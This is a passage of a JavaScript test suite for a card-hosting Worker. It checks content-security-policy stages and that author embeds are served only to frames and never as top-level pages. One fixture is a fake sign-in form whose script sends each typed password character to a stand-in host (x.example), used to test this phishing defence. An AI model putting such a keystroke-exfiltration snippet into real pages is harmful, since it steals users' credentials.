          const r = await get(docUrl, s);
          assert.equal(r.status, 404);
          assert.deepEqual([...r.headers], [...unbound.headers], `${where}, ${what}, ${stage}`);
          assert.equal(await r.text(), await unbound.text(), `${where}, ${what}, ${stage}`);
          continue;
        }
        await isEmptyEmbed(await get(docUrl, s), `${where}, ${what}, ${stage}`);
        await isEmptyEmbed(await get(docUrl, s, { method: 'HEAD' }), `${where}, ${what}, ${stage}, HEAD`);
        asked += 2;
      }
    }
    // the same page loaded with the setting unset (the default) holds no address to ask: its embed is srcdoc
    const before = await (await worker.fetch(new Request(pageUrl), { CARDS: editable(seed).CARDS, ...extra })).text();
    assert.ok(!before.includes('/_embed/') && framesOf(before)[0].srcdoc, `${where}: by default the embed is not its own document`);
  }
  console.log(`# the default's review, finding 1: ${asked} edited embed addresses answered the empty document`);
});

test('the default\'s review, finding 2: a rollback with a page loaded before it — the embed addresses that page names answer as they did, in every stage', async () => {
  let asked = 0;
  for (const [where, pageUrl, seed, , extra] of [...EDIT_SHAPES, ['two embeds, relative addresses', 'http://localhost/aster', { aster: RELATIVE_EMBED(DECK_JS_PATH) }, 'aster', {}]]) {
    const get = (u, s, init = {}) => worker.fetch(new Request(u, asFrame(u, init)), { CARDS: editable(seed).CARDS, ...extra, ...s });
    // loaded while the Worker enforced
    const frames = framesOf(await (await get(pageUrl, ON)).text());
    assert.ok(frames.length >= 1 && frames.every((f) => f.src), `${where}: under "enforce" every embed is its own document`);
    for (const f of frames) {
      const docUrl = new URL(f.src, pageUrl).href;
      const then = await get(docUrl, ON);
      const body = await then.text();
      assert.equal(then.status, 200, where);
      // …asked after the setting went back ("off", or unset), or forward again
      for (const [stage, s] of EVERY_STAGE) {
        const r = await get(docUrl, s);
        assert.equal(r.status, 200, `${where}, ${stage}: ${docUrl}`);
        assert.deepEqual([...r.headers], [...then.headers], `${where}, ${stage}: headers`);
        assert.equal(await r.text(), body, `${where}, ${stage}: not the document the page was loaded with`);
        assert.equal((await get(docUrl, s, { method: 'HEAD' })).status, 200, `${where}, ${stage}: HEAD`);
        asked += 1;
      }
    }
  }
  console.log(`# the default's review, finding 2: ${asked} embed addresses of an enforced page answered after the setting moved`);
});

test('the default\'s review, finding 3: report-only (the default) keeps every embed srcdoc — the page "off" serves, plus the header; only "enforce" names an address', async () => {
  const own = editable(OWN_SEED('aster', WITH_EMBED));
  const shapes = [['/embedded', store()], ['/onback', store()], [`/_preview/${'d'.repeat(32)}`, store()], [`/longembedded?w=${EMBED_WINDOW}`, store()],
    ['/aster', store()], ['https://own.example/', own.CARDS]];
  for (const [path, CARDS_] of shapes) {
    const u = path.startsWith('https:') ? path : `http://localhost${path}`;
    const get = (s) => worker.fetch(new Request(u), { CARDS: CARDS_, PREVIEW: 'false', ...s });
    const off = await (await get(OFF)).text();
    assert.ok(framesOf(off).length >= 1 && framesOf(off).every((f) => f.srcdoc), `${path}: off, srcdoc`);
    for (const [name, s] of [['unset', {}], ['"report-only"', { CARDS_PAGE_CSP: 'report-only' }], ['a typo', { CARDS_PAGE_CSP: 'Enforce' }]]) {
      const r = await get(s);
      assert.ok(r.headers.get(REPORTED), `${path} ${name}: the report-only header`);
      assert.equal(await r.text(), off, `${path} ${name}: the body is not the page "off" serves`);
    }
    const enforced = await (await get(ON)).text();
    assert.ok(framesOf(enforced).every((f) => f.src && !f.srcdoc) && enforced.includes('/_embed/'), `${path}: enforce, every embed its own document`);
  }
});

// ── the default's closing review: an embed address is a frame's document, never a top-level page ─────────
// The address answers in every stage (finding 2 above), and nothing links to it: only an embed's frame asks it.
// Asked as anything else — a top-level page (Sec-Fetch-Dest: document), any other destination, or with no
// Sec-Fetch-Dest at all — it is the empty document, so an author's embed is never a page of its own on the
// shared host (the review's input: a sign-in form whose script sends each keystroke elsewhere).
const PHISH = '- [ ] %% card: embed w=6 %% <h1>Sign in to feelreef</h1><input type=password id=p><script>p.oninput=()=>fetch("https://x.example/?"+p.value)</script>\n';
const PHISH_MD = `---\ncard-page: t\ntitle: Aster\n---\n\n## grid\n\n${PHISH}`;
const NOT_A_FRAME = [[null, 'no Sec-Fetch-Dest'], ['document', 'a top-level page'], ['empty', 'fetch()'], ['script', 'a script'], ['object', 'an <object>'], ['embed', 'an <embed>'],
  ['image', 'a picture'], ['iframe, document', 'two values'], ['IFRAME', 'another case'], ['nested-document', 'not a frame\'s token']];
const destInit = (dest, init = {}) => (dest == null ? init : { ...init, headers: { 'sec-fetch-dest': dest } });

test('the default\'s closing review: an embed address answers its document only to a frame (Sec-Fetch-Dest iframe or frame) — a top-level page, any other destination and no header get the empty document, in every stage', async () => {
  const shapes = [
    // [what, the page's address, the store, the deployment's settings, a line of the embed's own document]
    ['the review\'s input: a shared host', 'https://card.feelreef.com/aster', { aster: PHISH_MD }, { PREVIEW: 'false' }, 'p.oninput='],
    ['a person\'s own domain', 'https://own.example/', OWN_SEED('aster', PHISH_MD), { PREVIEW: 'false' }, 'p.oninput='],
    ['the root card', 'https://reef.cards/', { feelreef: PHISH_MD }, { CARD_CANONICAL_HOST: 'reef.cards', PREVIEW: 'false' }, 'p.oninput='],
    ['a preview', `https://card.feelreef.com/_preview/${PV_EDIT}`, { [`_preview:${PV_EDIT}`]: PHISH_MD }, { PREVIEW: 'false' }, 'p.oninput='],
    ['a long file\'s window', `http://localhost/longedit?w=${EMBED_WINDOW}`, { longedit: CARDS.longembedded }, {}, '<script>1</script>'],
  ];
  let frames = 0; let refused = 0;
  for (const [where, pageUrl, seed, extra, line] of shapes) {
    const st = editable(seed);
    const get = (u, s, init = {}) => worker.fetch(new Request(u, init), { CARDS: st.CARDS, ...extra, ...s });
    const [f] = framesOf(await (await get(pageUrl, ON)).text());
    assert.ok(f && f.src, `CONTROL ${where}: under "enforce" the embed names its address`);
    const docUrl = new URL(f.src, pageUrl).href;
    for (const [stage, s] of EVERY_STAGE) {
      for (const [dest, what] of NOT_A_FRAME) {
        await isEmptyEmbed(await get(docUrl, s, destInit(dest)), `${where}, ${stage}, ${what}`);
        await isEmptyEmbed(await get(docUrl, s, destInit(dest, { method: 'HEAD' })), `${where}, ${stage}, ${what}, HEAD`);
        refused += 2;
      }
      for (const dest of ['iframe', 'frame']) {
        const r = await get(docUrl, s, destInit(dest));
        assert.equal(r.status, 200, `${where}, ${stage}, ${dest}: ${docUrl}`);
        assert.equal(r.headers.get('vary'), 'Sec-Fetch-Dest', `${where}, ${stage}, ${dest}: a cache keeps the frame's answer apart from a page's`);
        const body = await r.text();
        assert.ok(body.startsWith(EMBED_DOC_HEAD) && body.includes(line), `${where}, ${stage}, ${dest}: not the embed's document`);
        assert.equal((await get(docUrl, s, destInit(dest, { method: 'HEAD' }))).status, 200, `${where}, ${stage}, ${dest}: HEAD`);
        frames += 2;
      }
    }
    // a person's own domain whose file is gone answers every address as before — the small 404 an unbound domain
    // gives, whoever asks: the destination changes nothing there
    if (where === 'a person\'s own domain') {
      st.seed['stop:aster'] = '1';
      const unbound = await get('https://own.example/wp-login.php', {});
      for (const dest of [null, 'document', 'iframe']) {
        const r = await get(docUrl, {}, destInit(dest));
        assert.equal(r.status, 404, `${where}, stopped, ${dest}`);
        assert.deepEqual([...r.headers], [...unbound.headers], `${where}, stopped, ${dest}`);
      }
    }
  }
  console.log(`# the default's closing review: ${frames} frame requests answered the embed's document, ${refused} other requests the empty document`);
});

// ── where it is NOT sent ───────────────────────────────────────────────────────────────────────
test('only a person\'s page, a preview and the "no card" pages: not the editor, the API, the report page, the .md exits, pictures or the deck\'s files', async () => {
  const split = { CARD_CANONICAL_HOST: 'reef.cards', PREVIEW: 'false' };
  const own = [];
  for (const [host, path, settings, init] of [
    ['localhost', '/try/edit', {}], ['localhost', '/edit?host=https://feelreef.com', {}],
    ['localhost', '/every.md', {}], ['localhost', '/every', {}, { headers: { accept: 'text/markdown' } }], ['localhost', '/every/avatar', {}], ['localhost', '/every/favicon.ico', {}],
    ['localhost', DECK_JS_PATH, {}], ['localhost', DECK_JS_PATH.replace(/\.js$/, '.css'), {}], ['localhost', '/_api/card/every', {}], ['reef.cards', '/.well-known/security.txt', { CARD_CANONICAL_HOST: 'reef.cards', PREVIEW: 'false' }],
    ['reef.cards', '/report', split],
  ]) {
    const scheme = host === 'localhost' ? 'http' : 'https';
    const off = await worker.fetch(new Request(`${scheme}://${host}${path}`, init), { CARDS: store(), ...settings, ...OFF });
    for (const stage of [undefined, 'report-only', 'enforce']) {
      const r = await worker.fetch(new Request(`${scheme}://${host}${path}`, init), { CARDS: store(), ...settings, CARDS_PAGE_CSP: stage });
      assert.equal(r.status, off.status, `${host}${path}`);
      assert.deepEqual([...r.headers], [...off.headers], `${host}${path} ${stage}: the setting changed this answer's headers`);
      assert.equal(r.headers.get(REPORTED), null, `${host}${path}`);
    }
    if (off.headers.get(ENFORCED)) own.push(`${host}${path}`);
  }
  // the two pages with a policy of their own keep exactly theirs
  assert.deepEqual(own, ['localhost/edit?host=https://feelreef.com', 'reef.cards/report']);
});

// ── main, with an embed on its pages: "off" is main; the default adds one header; "enforce" renames it ──
// service-host-off.fixture.json is main's Worker (its `base`, a commit on main) asked with every setting unset,
// and its files hold an embed (GRID_EMBED) on a person's page and on the preview. So this compares the default
// with main itself, embeds present — not this tree with a capture of its own.
// The grid also asks the address of that embed's own document (GRID_EMBED_HASH: a person's, the preview's, and a
// person's own domain's spelling) as a frame, as a top-level page and with no Sec-Fetch-Dest. Main answers those
// like any path it does not know; this tree's answers there are the one difference from main besides the
// policy header, and each is checked against what it may be (checkEmbedRows, below).
const FIXTURE = readFixture();
const CASES = gridCases();
const sorted = (headers) => [...headers].sort(([a], [b]) => (a < b ? -1 : a > b ? 1 : 0));
// main sends no page policy: an answer of main that carries one has a policy of its own (the report page, host mode)
const ownPolicy = (a) => a.headers.some(([k]) => k === ENFORCED || k === REPORTED);
// a person's page or a preview (200, at these requests), or a "no card" page (404, at whatever path was missed)
const PAGE_REQUEST = /^(GET|HEAD) \/(\?lang=ja|\?ref=aster|aster|aster\?utm=qr|feelreef|_preview\/b{32})?$/;
const requestOf = (key) => key.split(' ').slice(2).join(' ');
// an embed-address row of the grid: { address, dest } (dest as named in the row: iframe, document, no Sec-Fetch-Dest)
const EMBED_ROW = /^GET (\S*\/_embed\/<embed>) \((iframe|document|no Sec-Fetch-Dest)\)$/;
const embedRowOf = (c) => { const m = EMBED_ROW.exec(c.name); return m ? { address: m[1], dest: m[2] } : null; };
const EMBED_ROWS = CASES.filter(embedRowOf);
/**
 * Every embed-address row, asked of this tree under `settings`, against main:
 *   'document'  the embed's own document (200, its own policy, Vary: Sec-Fetch-Dest) — only ever to a frame;
 *   'empty'     the empty document (embedMissResponse);
 *   'main'      main's answer, but for the page policy header: the address does not reach the embed route there
 *               (a shared host's root, a host with no Cards, a redirect) — and then the destination changes nothing.
 * For each stage, host and address: the top-level and the header-less request answer alike, and never 'document';
 * they are 'empty' wherever the frame's request reaches the embed route, and 'main' where it does not.
 * → { bad: [sentences], kinds: { 'iframe document': n, … } }
 */
async function checkEmbedRows(settings) {
  const bad = [];
  const kinds = {};
  const at = new Map();
  const pagePolicyOff = (a) => ({ ...a, headers: a.headers.filter(([k, v]) => k !== REPORTED && !(k === ENFORCED && v !== EMBED_DOCUMENT_POLICY)) });
  await atFixedClock(async () => {
    for (const c of EMBED_ROWS) {
      const { address, dest } = embedRowOf(c);
      const got = await answerOf(worker, c, settings, { text: true });
      const policy = Object.fromEntries(got.headers);
      let kind;
      if (got.status === 200 && policy['content-security-policy'] === EMBED_DOCUMENT_POLICY && policy.vary === 'Sec-Fetch-Dest'
        && got.text.startsWith(EMBED_DOC_HEAD) && got.text.includes('t.textContent = "ran"')) kind = 'document';
      else if (got.status === 404 && JSON.stringify(got.headers) === JSON.stringify(EMPTY_EMBED_HEADERS) && got.text === EMBED_DOC_HEAD) kind = 'empty';
      else if (answerDiff(pagePolicyOff({ ...got, text: undefined }), FIXTURE.answers[c.key]) === '') kind = 'main';
      else { bad.push(`${c.key}: neither the embed's document, the empty document nor main's answer`); continue; }
      kinds[`${dest} ${kind}`] = (kinds[`${dest} ${kind}`] || 0) + 1;
      const group = `${c.stage} ${c.host} ${address}`;
      if (!at.has(group)) at.set(group, {});
      at.get(group)[dest] = kind;
    }
  });
  for (const [group, k] of at) {
    if (k.document === 'document' || k['no Sec-Fetch-Dest'] === 'document') bad.push(`${group}: the embed's document to a request that is not a frame's`);
    if (k.document !== k['no Sec-Fetch-Dest']) bad.push(`${group}: a top-level page and a header-less request answer differently`);
    if (k.document !== (k.iframe === 'main' ? 'main' : 'empty')) bad.push(`${group}: a frame gets ${k.iframe}, a top-level page ${k.document}`);
  }
  // the review's own case, and the other two spellings, reach the route: a frame gets the document, a page the empty one
  for (const group of ['dark card.feelreef.com /aster/_embed/<embed>', `dark card.feelreef.com /_preview/${GRID_PREVIEW}/_embed/<embed>`, 'dark own.example /_embed/<embed>']) {
    const k = at.get(group) || {};
    if (k.iframe !== 'document' || k.document !== 'empty') bad.push(`CONTROL ${group}: ${JSON.stringify(k)}`);
  }
  return { bad, kinds };
}
const kindsLine = (kinds) => Object.entries(kinds).map(([k, n]) => `${n} × ${k}`).join(', ');

test('CONTROL: the fixture is main\'s Worker, and the grid\'s pages hold an embed — main\'s bytes, srcdoc; the grid asks that embed\'s address', async () => {
  assert.match(FIXTURE.base, /^[0-9a-f]{40}$/);
  assert.ok(GRID_SEED.aster.includes(GRID_EMBED) && GRID_SEED[`_preview:${GRID_PREVIEW}`].includes(GRID_EMBED));
  let pages = 0;
  await atFixedClock(async () => {
    for (const key of ['canonical own.example GET /', 'dark own.example GET /', `open card.feelreef.com GET /_preview/${GRID_PREVIEW}`, `canonical reef.cards GET /_preview/${GRID_PREVIEW}`]) {
      const c = CASES.find((x) => x.key === key);
      const got = await answerOf(worker, c, OFF, { text: true });
      assert.equal(got.status, 200, key);
      assert.equal(got.sha, FIXTURE.answers[key].sha, `${key}: not main's page`);
      assert.match(got.text, /<iframe sandbox="allow-scripts" srcdoc="[^"]*t\.textContent = &quot;ran&quot;/, `${key}: the embed is not on the page`);
      // and under "enforce" the page names the address the grid asks
      const [f] = framesOf((await answerOf(worker, c, ON, { text: true })).text);
      assert.equal(f.src.split('/_embed/')[1], GRID_EMBED_HASH, `${key}: the grid asks another embed's address`);
      pages += 1;
    }
  });
  assert.equal(pages, 4);
  assert.equal(EMBED_ROWS.length, Object.keys(GRID_STAGES).length * GRID_HOSTS.length * 9);
  for (const c of EMBED_ROWS) assert.ok(FIXTURE.answers[c.key], `the fixture does not hold ${c.key}`);
});

test('"off": all 903 answers and the 11,664 of the wide grid are main\'s, byte for byte — headers and store reads included — but for the embed addresses, which answer only a frame with the embed\'s document', async () => {
  const bad = [];
  await atFixedClock(async () => {
    for (const c of CASES) { if (embedRowOf(c)) continue; const d = answerDiff(await answerOf(worker, c, OFF), FIXTURE.answers[c.key]); if (d) bad.push(`${c.key}: ${d}`); }
    const wide = wideCases();
    for (let i = 0; i < wide.length; i++) { const d = answerDiff(await wideAnswerOf(worker, wide[i], OFF), FIXTURE.wide[i]); if (d) bad.push(`${wide[i].key}: ${d}`); }
  });
  const embeds = await checkEmbedRows(OFF);
  console.log(`# cardtile page csp "off": ${CASES.length - EMBED_ROWS.length} + 11664 answers compared with main, ${bad.length} mismatches; ${EMBED_ROWS.length} embed addresses: ${kindsLine(embeds.kinds)}, ${embeds.bad.length} wrong`);
  assert.deepEqual(bad.slice(0, 10), [], `${bad.length} mismatches`);
  assert.deepEqual(embeds.bad.slice(0, 10), [], `${embeds.bad.length} embed addresses`);
});

test('the default: of main\'s 903, people\'s pages, the preview and the "no card" pages carry one more header — the report-only policy — and nothing else differs, bodies with an embed included, but for the embed addresses (a frame\'s document only); under every spelling that is not "off" or "enforce"', async () => {
  for (const [name, extra] of [['unset', {}], ['"report-only"', { CARDS_PAGE_CSP: 'report-only' }], ['empty', { CARDS_PAGE_CSP: '' }], ['"1"', { CARDS_PAGE_CSP: '1' }],
    ['"Off"', { CARDS_PAGE_CSP: 'Off' }], ['another case', { CARDS_PAGE_CSP: 'Enforce' }], ['a trailing space', { CARDS_PAGE_CSP: 'off ' }], ['a typo', { CARDS_PAGE_CSP: 'enforced' }]]) {
    const bad = [];
    const changed = [];
    await atFixedClock(async () => {
      for (const c of CASES) {
        if (embedRowOf(c)) continue;
        const got = await answerOf(worker, c, extra);
        const want = FIXTURE.answers[c.key];
        const added = got.headers.filter(([k]) => k === REPORTED);
        const d = answerDiff({ ...got, headers: got.headers.filter(([k]) => k !== REPORTED) }, want);
        if (d) bad.push(`${c.key}: ${d}`);
        if (added.length) {
          if (ownPolicy(want) || added.length !== 1) bad.push(`${c.key}: the header on an answer with a policy of its own, or twice`);
          if (!(want.status === 404 || PAGE_REQUEST.test(requestOf(c.key)))) bad.push(`${c.key}: an answer that is not a person's page carries the header`);
          if (!got.headers.some(([k, v]) => k === 'content-type' && v === 'text/html; charset=utf-8')) bad.push(`${c.key}: not a page`);
          changed.push(c.key);
        }
      }
    });
    const embeds = await checkEmbedRows(extra);
    console.log(`# cardtile page csp ${name}: ${CASES.length - EMBED_ROWS.length} answers compared with main, ${bad.length} mismatches; ${changed.length} carry the one added header; ${EMBED_ROWS.length} embed addresses: ${kindsLine(embeds.kinds)}, ${embeds.bad.length} wrong`);
    assert.deepEqual(bad.slice(0, 10), [], name);
    assert.deepEqual(embeds.bad.slice(0, 10), [], `${name}: ${embeds.bad.length} embed addresses`);
    // the pages with the embed are among them: same body as main, plus the header
    for (const k of ['canonical own.example GET /', 'dark own.example GET /', `open card.feelreef.com GET /_preview/${GRID_PREVIEW}`]) assert.ok(changed.includes(k), `${name}: ${k} carries no policy`);
    const notFound = new Set(changed.filter((k) => FIXTURE.answers[k].status === 404).map((k) => FIXTURE.answers[k].sha));
    // the 404s are the "no card" pages: a handful of bodies (language × host asked, and the small one), not one per path
    assert.ok(notFound.size > 0 && notFound.size <= 8, `${name}: ${notFound.size} distinct 404 bodies carry the header`);
  }
  // and the wide grid, unset: main's answers but for the one header
  const bad = [];
  await atFixedClock(async () => {
    const wide = wideCases();
    for (let i = 0; i < wide.length; i++) {
      const got = await wideAnswerOf(worker, wide[i]);
      const d = answerDiff({ ...got, headers: got.headers.filter(([k]) => k !== REPORTED) }, FIXTURE.wide[i]);
      if (d) bad.push(`${wide[i].key}: ${d}`);
    }
  });
  console.log(`# cardtile page csp unset, wide grid: 11664 answers compared with main, ${bad.length} mismatches`);
  assert.deepEqual(bad.slice(0, 10), [], `${bad.length} mismatches`);
});

test('"enforce": of main\'s 903, the same answers carry the policy as the enforcing header, a page with an embed differs from main by its frame\'s one attribute, and the embed addresses answer only a frame with the embed\'s document', async () => {
  const changed = [];
  let framed = 0;
  await atFixedClock(async () => {
    for (const c of CASES) {
      if (embedRowOf(c)) continue;
      const got = await answerOf(worker, c, ON, { text: true });
      const want = FIXTURE.answers[c.key];
      const ours = !ownPolicy(want) && got.headers.some(([k]) => k === ENFORCED);
      const headers = ours ? got.headers.filter(([k]) => k !== ENFORCED) : got.headers;
      if (got.sha !== want.sha) {
        // the one body that may move: an embed's frame, `srcdoc="…"` → `src="<base>_embed/<hash>"` (main's own body is this tree's "off")
        const off = await answerOf(worker, c, OFF, { text: true });
        assert.equal(off.sha, want.sha, `${c.key}: "off" is not main`);
        const [a] = framesOf(off.text);
        const [b] = framesOf(got.text);
        assert.ok(a && a.srcdoc && b && b.src && /_embed\/[0-9a-f]{64}$/.test(b.src), `${c.key}: a body moved that has no embed`);
        assert.equal(got.text, off.text.replace(` srcdoc="${a.srcdoc}"`, ` src="${b.src}"`), `${c.key}: the page moved elsewhere than its embed's frame`);
        framed += 1;
        assert.equal(answerDiff({ ...got, sha: want.sha, bytes: want.bytes, headers }, want), '', c.key);
      } else assert.equal(answerDiff({ ...got, headers }, want), '', `enforce ${c.key}`);
      if (ours) {
        assert.ok(want.status === 404 || PAGE_REQUEST.test(requestOf(c.key)), `an answer that is not a person's page carries the header: ${c.key}`);
        changed.push(c.key);
      }
    }
  });
  const embeds = await checkEmbedRows(ON);
  console.log(`# cardtile page csp enforce: ${changed.length} of ${CASES.length - EMBED_ROWS.length} answers carry the enforcing policy; ${framed} pages with an embed name its document; ${EMBED_ROWS.length} embed addresses: ${kindsLine(embeds.kinds)}, ${embeds.bad.length} wrong`);
  assert.ok(changed.length > 0 && framed > 0);
  assert.deepEqual(embeds.bad.slice(0, 10), [], `${embeds.bad.length} embed addresses`);
});
